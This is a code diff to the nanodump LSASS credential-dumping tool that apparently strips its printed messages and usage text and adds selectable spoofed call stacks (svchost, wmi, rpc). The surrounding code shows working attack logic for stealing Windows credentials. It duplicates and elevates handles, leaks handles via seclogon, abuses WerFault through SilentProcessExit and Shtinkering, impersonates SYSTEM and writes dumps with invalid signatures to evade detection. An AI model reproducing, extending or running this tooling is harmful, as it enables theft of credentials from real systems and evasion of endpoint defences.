@@ -33,7 +33,7 @@ void go(char* args, int length)
     BOOL           use_silent_process_exit;
     LPCSTR         silent_process_exit;
     BOOL           use_lsass_shtinkering;
-    BOOL           spoof_callstack;
+    DWORD          spoof_callstack;
     PPROCESS_LIST  created_processes = NULL;
     HANDLE         hSnapshot = NULL;
     WCHAR          wcFilePath[MAX_PATH];
@@ -65,7 +65,7 @@ void go(char* args, int length)
     use_seclogon_leak_remote = (BOOL)BeaconDataInt(&parser);
     seclogon_leak_remote_binary = BeaconDataExtract(&parser, NULL);
     use_seclogon_duplicate = (BOOL)BeaconDataInt(&parser);
-    spoof_callstack = (BOOL)BeaconDataInt(&parser);
+    spoof_callstack = BeaconDataInt(&parser);
     use_silent_process_exit = (BOOL)BeaconDataInt(&parser);
     silent_process_exit = BeaconDataExtract(&parser, NULL);
     use_lsass_shtinkering = (BOOL)BeaconDataInt(&parser);
@@ -85,12 +85,12 @@ void go(char* args, int length)
     }
     else
     {
-        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
+       
     }
 
     if (get_pid_and_leave)
     {
-        PRINT(LSASS " PID: %ld", lsass_pid);
+        
         return;
     }
 
@@ -98,7 +98,7 @@ void go(char* args, int length)
     {
         if (!create_folder(silent_process_exit))
         {
-            PRINT_ERR("The folder \"%s\" is not valid.", silent_process_exit);
+            
             return;
         }
         // let the Windows Error Reporting process make the dump for us
@@ -121,11 +121,11 @@ void go(char* args, int length)
 
         if (!running_as_system)
         {
-            DPRINT("The options --elevate-handle and --duplicate-elevate require SYSTEM, impersonating...");
+            
             success = impersonate_system(&hImpersonate);
             if (!success)
                 goto cleanup;
-            DPRINT("Impersonating SYSTEM")
+           
         }
     }
 
@@ -170,14 +170,14 @@ void go(char* args, int length)
     // set the signature
     if (use_valid_sig)
     {
-        DPRINT("Using a valid signature");
+       
         dc.Signature = MINIDUMP_SIGNATURE;
         dc.Version = MINIDUMP_VERSION;
         dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
     }
     else
     {
-        DPRINT("Using a invalid signature");
+      
         generate_invalid_sig(
             &dc.Signature,
             &dc.Version,
@@ -199,9 +199,7 @@ void go(char* args, int length)
     if (!success)
         goto cleanup;
 
-    DPRINT(
-        "The dump was created successfully, final size: %d MiB",
-        (dc.rva/1024)/1024);
+
 
     if (!use_valid_sig)
     {
@@ -263,44 +261,7 @@ cleanup:
 
 void usage(char* procname)
 {
-    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", procname);
-    PRINT("Dumpfile options:");
-    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
-    PRINT("            filename of the dump");
-    PRINT("    --valid, -v");
-    PRINT("            create a dump with a valid signature");
-    PRINT("Obtain an LSASS handle via:");
-    PRINT("    --duplicate, -d");
-    PRINT("            duplicate a high privileged existing " LSASS " handle");
-    PRINT("    --duplicate-elevate, -de");
-    PRINT("            duplicate a low privileged existing " LSASS " handle and then elevate it");
-    PRINT("    --seclogon-leak-local, -sll");
-    PRINT("            leak an " LSASS " handle into nanodump via seclogon");
-    PRINT("    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH");
-    PRINT("            leak an " LSASS " handle into another process via seclogon and duplicate it");
-    PRINT("    --seclogon-duplicate, -sd");
-    PRINT("            make seclogon open a handle to " LSASS " and duplicate it");
-    PRINT("    --spoof-callstack, -sc");
-    PRINT("            open a handle to " LSASS " using a fake calling stack");
-    PRINT("Let WerFault.exe (instead of nanodump) create the dump");
-    PRINT("    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER");
-    PRINT("            force WerFault.exe to dump " LSASS " via SilentProcessExit");
-    PRINT("    --shtinkering, -sk");
-    PRINT("            force WerFault.exe to dump " LSASS " via Shtinkering");
-    PRINT("Avoid reading " LSASS " directly:");
-    PRINT("    --fork, -f");
-    PRINT("            fork the target process before dumping");
-    PRINT("    --snapshot, -s");
-    PRINT("            snapshot the target process before dumping");
-    PRINT("Avoid opening a handle with high privileges:")
-    PRINT("    --elevate-handle, -eh");
-    PRINT("            open a handle to " LSASS " with low privileges and duplicate it to gain higher privileges");
-    PRINT("Miscellaneous:");
-    PRINT("    --getpid");
-    PRINT("            print the PID of " LSASS " and leave");
-    PRINT("Help:");
-    PRINT("    --help, -h");
-    PRINT("            print this help message and leave");
+    // this
 }
 
 int main(int argc, char* argv[])
@@ -324,7 +285,7 @@ int main(int argc, char* argv[])
     LPCSTR         seclogon_leak_remote_binary    = NULL;
     BOOL           use_seclogon_duplicate         = FALSE;
     BOOL           use_lsass_shtinkering          = FALSE;
-    BOOL           spoof_callstack                = FALSE;
+    DWORD          spoof_callstack                = 0;
     HANDLE         hSnapshot                      = NULL;
     PPROCESS_LIST  created_processes              = NULL;
     BOOL           ret_val                        = FALSE;
@@ -351,7 +312,7 @@ int main(int argc, char* argv[])
 #ifdef _M_IX86
     if (local_is_wow64())
     {
-        PRINT_ERR("Nanodump does not support WoW64");
+        
         return 0;
     }
 #endif
@@ -372,7 +333,7 @@ int main(int argc, char* argv[])
         {
             if (i + 1 >= argc)
             {
-                PRINT("missing --write value");
+                
                 return 0;
             }
             dump_path = argv[++i];
@@ -383,7 +344,7 @@ int main(int argc, char* argv[])
         {
             if (i + 1 >= argc)
             {
-                PRINT("missing --pid value");
+                
                 return 0;
             }
             i++;
@@ -391,7 +352,7 @@ int main(int argc, char* argv[])
             if (!lsass_pid ||
                 strspn(argv[i], "0123456789") != strlen(argv[i]))
             {
-                PRINT("Invalid PID: %s", argv[i]);
+                
                 return 0;
             }
         }
@@ -431,18 +392,18 @@ int main(int argc, char* argv[])
             use_seclogon_leak_remote = TRUE;
             if (i + 1 >= argc)
             {
-                PRINT("missing --seclogon-leak-remote value");
+                
                 return 0;
             }
             seclogon_leak_remote_binary = argv[++i];
             if (!strrchr(seclogon_leak_remote_binary, '\\'))
             {
-                PRINT("You must provide a full path: %s", seclogon_leak_remote_binary);
+                
                 return 0;
             }
             if (!file_exists(seclogon_leak_remote_binary))
             {
-                PRINT("The binary \"%s\" does not exists.", seclogon_leak_remote_binary);
+                
                 return 0;
             }
         }
@@ -456,13 +417,13 @@ int main(int argc, char* argv[])
         {
             if (i + 1 >= argc)
             {
-                PRINT("missing --silent-process-exit value");
+                
                 return 0;
             }
             silent_process_exit = argv[++i];
             if (!create_folder(silent_process_exit))
             {
-                PRINT("The folder \"%s\" is not valid.", silent_process_exit);
+                
                 return 0;
             }
         }
@@ -477,7 +438,7 @@ int main(int argc, char* argv[])
 
             if (!running_as_system)
             {
-                PRINT_ERR("You must be SYSTEM to run the Shtinkering technique");
+                
                 return 0;
             }
         }
@@ -490,17 +451,41 @@ int main(int argc, char* argv[])
         {
             if (i + 1 >= argc)
             {
-                PRINT("missing -sync value");
+                
                 return 0;
             }
             do_synchronize = TRUE;
             get_full_path(&synchronization_file, argv[++i]);
         }
+#ifdef _WIN64
         else if (!strncmp(argv[i], "-sc", 4) ||
                  !strncmp(argv[i], "--spoof-callstack", 18))
         {
-            spoof_callstack = TRUE;
+            if (i + 1 >= argc)
+            {
+                
+                return 0;
+            }
+            i++;
+            if (!strncmp(argv[i], "svchost", 8))
+            {
+                spoof_callstack = SVC_STACK;
+            }
+            else if (!strncmp(argv[i], "wmi", 4))
+            {
+                spoof_callstack = WMI_STACK;
+            }
+            else if (!strncmp(argv[i], "rpc", 4))
+            {
+                spoof_callstack = RPC_STACK;
+            }
+            else
+            {
+                
+                return 0;
+            }
         }
+#endif
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
         {
@@ -509,7 +494,7 @@ int main(int argc, char* argv[])
         }
         else
         {
-            PRINT("invalid argument: %s", argv[i]);
+            
             return 0;
         }
     }
@@ -524,12 +509,12 @@ int main(int argc, char* argv[])
         num_modes++;
     if (num_modes != 1)
     {
-        PRINT("Only one of the following parameters must be provided:")
-        PRINT(" --write: nanodump will create the dump");
-        PRINT(" --silent-process-exit: WerFault will create the dump via SilentProcessExit");
-        PRINT(" --shtinkering: WerFault will create the dump via Shtinkering");
-        PRINT(" --getpid: get the PID of " LSASS);
-        PRINT("Enter --help for more details");
+        
+        
+        
+        
+        
+        
         return 0;
     }
 
@@ -538,7 +523,7 @@ int main(int argc, char* argv[])
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
          use_seclogon_leak_remote || duplicate_handle || silent_process_exit))
     {
-        PRINT("The parameter --getpid is used alone");
+        
         return 0;
     }
 
@@ -547,157 +532,157 @@ int main(int argc, char* argv[])
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
          use_seclogon_leak_remote || duplicate_handle || elevate_handle || duplicate_elevate))
     {
-        PRINT("The parameter --silent-process-exit is used alone");
+        
         return 0;
     }
 
     if (fork_lsass && snapshot_lsass)
     {
-        PRINT("The options --fork and --snapshot cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_handle && elevate_handle)
     {
-        PRINT("The options --duplicate and --elevate-handle cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_elevate && spoof_callstack)
     {
-        PRINT("The options --duplicate-elevate and --spoof-callstack cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_handle && spoof_callstack)
     {
-        PRINT("The options --duplicate and --spoof-callstack cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_handle && use_seclogon_duplicate)
     {
-        PRINT("The options --duplicate and --seclogon-duplicate cannot be used together");
+        
         return 0;
     }
 
     if (elevate_handle && duplicate_elevate)
     {
-        PRINT("The options --elevate-handle and --duplicate-elevate cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_elevate && duplicate_handle)
     {
-        PRINT("The options --duplicate-elevate and --duplicate cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_elevate && use_seclogon_duplicate)
     {
-        PRINT("The options --duplicate-elevate and --seclogon-duplicate cannot be used together");
+        
         return 0;
     }
 
     if (elevate_handle && use_seclogon_duplicate)
     {
-        PRINT("The options --elevate-handle and --seclogon-duplicate cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_handle && use_seclogon_leak_local)
     {
-        PRINT("The options --duplicate and --seclogon-leak-local cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_elevate && use_seclogon_leak_local)
     {
-        PRINT("The options --duplicate-elevate and --seclogon-leak-local cannot be used together");
+        
         return 0;
     }
 
     if (elevate_handle && use_seclogon_leak_local)
     {
-        PRINT("The options --elevate-handle and --seclogon-leak-local cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_handle && use_seclogon_leak_remote)
     {
-        PRINT("The options --duplicate and --seclogon-leak-remote cannot be used together");
+        
         return 0;
     }
 
     if (elevate_handle && use_seclogon_leak_remote)
     {
-        PRINT("The options --elevate-handle and --seclogon-leak-remote cannot be used together");
+        
         return 0;
     }
 
     if (duplicate_elevate && use_seclogon_leak_remote)
     {
-        PRINT("The options --duplicate-elevate and --seclogon-leak-remote cannot be used together");
+        
         return 0;
     }
 
     if (use_seclogon_leak_local && use_seclogon_leak_remote)
     {
-        PRINT("The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together");
+        
         return 0;
     }
 
     if (use_seclogon_leak_local && use_seclogon_duplicate)
     {
-        PRINT("The options --seclogon-leak-local and --seclogon-duplicate cannot be used together");
+        
         return 0;
     }
 
     if (use_seclogon_leak_local && spoof_callstack)
     {
-        PRINT("The options --seclogon-leak-local and --spoof-callstack cannot be used together");
+        
         return 0;
     }
 
     if (use_seclogon_leak_remote && use_seclogon_duplicate)
     {
-        PRINT("The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together");
+        
         return 0;
     }
 
     if (use_seclogon_leak_remote && spoof_callstack)
     {
-        PRINT("The options --seclogon-leak-remote and --spoof-callstack cannot be used together");
+        
         return 0;
     }
 
     if (use_seclogon_duplicate && spoof_callstack)
     {
-        PRINT("The options --seclogon-duplicate and --spoof-callstack cannot be used together");
+        
         return 0;
     }
 
     if (!use_lsass_shtinkering && use_seclogon_leak_local && !is_full_path(dump_path))
     {
-        PRINT("If --seclogon-leak-local is being used, you need to provide the full path: %s", dump_path);
+        
         return 0;
     }
 
     if (use_lsass_shtinkering && fork_lsass)
     {
-        PRINT("The options --shtinkering and --fork cannot be used together");
+        
         return 0;
     }
 
     if (use_lsass_shtinkering && snapshot_lsass)
     {
-        PRINT("The options --shtinkering and --snapshot cannot be used together");
+        
         return 0;
     }
 
     if (use_lsass_shtinkering && use_valid_sig)
     {
-        PRINT("The options --shtinkering and --valid cannot be used together");
+        
         return 0;
     }
 
@@ -716,13 +701,13 @@ int main(int argc, char* argv[])
     }
     else
     {
-        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
+        
     }
 
     // get the PID of LSASS and leave (is this even used by anyone?)
     if (get_pid_and_leave)
     {
-        PRINT(LSASS " PID: %ld", lsass_pid);
+        
         ret_val = TRUE;
         goto cleanup;
     }
@@ -735,11 +720,11 @@ int main(int argc, char* argv[])
 
         if (!running_as_system)
         {
-            DPRINT("The options --elevate-handle and --duplicate-elevate require SYSTEM, impersonating...");
+            
             success = impersonate_system(&hImpersonate);
             if (!success)
                 goto cleanup;
-            DPRINT("Impersonating SYSTEM")
+            
         }
     }
 
@@ -795,14 +780,14 @@ int main(int argc, char* argv[])
     // set the signature
     if (use_valid_sig)
     {
-        DPRINT("Using a valid signature");
+       
         dc.Signature = MINIDUMP_SIGNATURE;
         dc.Version = MINIDUMP_VERSION;
         dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
     }
     else
     {
-        DPRINT("Using a invalid signature");
+      
         generate_invalid_sig(
             &dc.Signature,
             &dc.Version,
@@ -824,9 +809,7 @@ int main(int argc, char* argv[])
     if (!success)
         goto cleanup;
 
-    DPRINT(
-        "The dump was created successfully, final size: %d MiB",
-        (dc.rva/1024)/1024);
+   
 
     if (!use_valid_sig)
     {
@@ -1077,7 +1060,6 @@ BOOL NanoDumpPPLDump(VOID)
 #ifdef _M_IX86
     if(local_is_wow64())
     {
-        PRINT_ERR("Nanodump does not support WoW64");
         return FALSE;
     }
 #endif
@@ -1126,7 +1108,7 @@ BOOL NanoDumpPPLDump(VOID)
         {
             if (i + 1 >= argc)
             {
-                PRINT("missing --write value");
+     
                 goto cleanup;
             }
             wcstombs(dump_path, argv[++i], MAX_PATH);
@@ -1137,7 +1119,7 @@ BOOL NanoDumpPPLDump(VOID)
         {
             if (i + 1 >= argc)
             {
-                PRINT("missing --pid value");
+                
                 goto cleanup;
             }
             i++;
@@ -1150,7 +1132,7 @@ BOOL NanoDumpPPLDump(VOID)
         }
         else
         {
-            PRINT("invalid argument: %s", argv[i]);
+            
             goto cleanup;
         }
     }
@@ -1173,12 +1155,12 @@ BOOL NanoDumpPPLDump(VOID)
     }
     else
     {
-        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
+        
     }
 
     if (!full_dump_path.Length)
     {
-        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
+        
         goto cleanup;
     }
 
@@ -1210,14 +1192,12 @@ BOOL NanoDumpPPLDump(VOID)
     // set the signature
     if (use_valid_sig)
     {
-        DPRINT("Using a valid signature");
         dc.Signature = MINIDUMP_SIGNATURE;
         dc.Version = MINIDUMP_VERSION;
         dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
     }
     else
     {
-        DPRINT("Using a invalid signature");
         generate_invalid_sig(
             &dc.Signature,
             &dc.Version,
@@ -1239,9 +1219,7 @@ BOOL NanoDumpPPLDump(VOID)
     if (!success)
         goto cleanup;
 
-    DPRINT(
-        "The dump was created successfully, final size: %d MiB",
-        (dc.rva/1024)/1024);
+
 
     if (!use_valid_sig)
     {
@@ -1407,7 +1385,7 @@ BOOL NanoDumpPPLMedic(VOID)
 #ifdef _M_IX86
     if(local_is_wow64())
     {
-        PRINT_ERR("Nanodump does not support WoW64");
+   
         return FALSE;
     }
 #endif
@@ -1431,7 +1409,7 @@ BOOL NanoDumpPPLMedic(VOID)
     }
     else
     {
-        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
+      
     }
 
     if (!create_file(&full_dump_path))
@@ -1462,14 +1440,12 @@ BOOL NanoDumpPPLMedic(VOID)
     // set the signature
     if (use_valid_sig)
     {
-        DPRINT("Using a valid signature");
         dc.Signature = MINIDUMP_SIGNATURE;
         dc.Version = MINIDUMP_VERSION;
         dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
     }
     else
     {
-        DPRINT("Using a invalid signature");
         generate_invalid_sig(
             &dc.Signature,
             &dc.Version,
@@ -1491,9 +1467,7 @@ BOOL NanoDumpPPLMedic(VOID)
     if (!success)
         goto cleanup;
 
-    DPRINT(
-        "The dump was created successfully, final size: %d MiB",
-        (dc.rva/1024)/1024);
+
 
     if (!use_valid_sig)
     {
